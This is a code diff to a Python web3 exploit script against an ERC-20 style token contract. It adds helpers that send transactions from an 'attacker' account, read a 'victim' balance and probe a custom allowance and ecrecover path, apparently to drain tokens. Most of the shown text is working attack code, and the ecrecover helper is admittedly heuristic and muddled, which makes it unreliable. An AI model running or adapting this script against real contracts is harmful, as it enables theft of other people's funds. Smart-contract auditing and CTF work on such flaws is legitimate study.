@@ -93,14 +93,70 @@ TOKEN_ABI = [
 
 # ===== CORE FUNCTIONS =====
 def send_transaction(contract_function, value=0, gas=300000, retries=3, delay=5):
-    # ... (same send_transaction as before)
+    """Robust transaction sending with retries and gas management"""
+    for attempt in range(retries):
+        try:
+            tx = contract_function.build_transaction({
+                "from": attacker_address,
+                "nonce": w3.eth.get_transaction_count(attacker_address),
+                "gas": gas,
+                "gasPrice": int(w3.eth.gas_price * 1.2),  # 20% gas premium
+                "value": value
+            })
+            signed = account.sign_transaction(tx)
+            tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
+            return w3.eth.wait_for_transaction_receipt(tx_hash)
+        except exceptions.TransactionNotFound:
+            if attempt == retries - 1:
+                raise
+            time.sleep(delay)
+        except ValueError as e:
+            if "replacement transaction underpriced" in str(e) and attempt < retries - 1:
+                time.sleep(delay)
+                continue
+            raise
 
 def verify_contract_state(token):
-    # ... (same verify_contract_state as before)
+    """Check key contract state variables"""
+    print("\n[+] Contract State Verification:")
+    try:
+        owner = token.functions.owner().call()
+        print(f"Current Owner: {owner}")
+    except exceptions.ContractLogicError as e:
+        print(f"Could not verify owner directly: {e}")
+    except Exception as e:
+        print(f"Could not verify owner: {e}")
+
+    victim_bal = token.functions.balanceOf(victim_address).call()
+    print(f"Victim Balance: {victim_bal}")
+
+    # Note: The standard allowance function won't reflect the custom allowance
+    # checked in _spendAllowance.
+    # allowance = token.functions.allowance(victim_address, attacker_address).call()
+    # print(f"Standard Allowance for Attacker: {allowance}")
+
+    max_supply = token.functions._maxSupply().call()
+    print(f"Max Supply: {max_supply}")
+
+    # We need to infer the custom allowance state, which is complex without
+    # direct access.
 
 def get_ecrecover_output():
-    # ... (same get_ecrecover_output as before)
-
+    """
+    Attempts to simulate the ecrecover behavior with the caller's address.
+    This is a heuristic and might not be perfectly accurate across all EVM versions.
+    """
+    message = encode_defunct(text=attacker_address.lower())
+    # We can't actually recover a signer without a signature.
+    # This will likely result in an invalid address or zero address.
+    # The goal is to see what the contract's staticcall to ecrecover *might* return.
+    try:
+        signature = w3.eth.account.sign_message(message, private_key=args.private_key).signature
+        recovered_address = w3.eth.account.recover_message(message, signature=signature)
+        return w3.toInt(hexstr=recovered_address)
+    except Exception as e:
+        print(f"Error simulating ecrecover: {e}")
+        return 0
 def calculate_keccak256_0_1():
     return w3.keccak(b'\x00' + b'\x01')
 
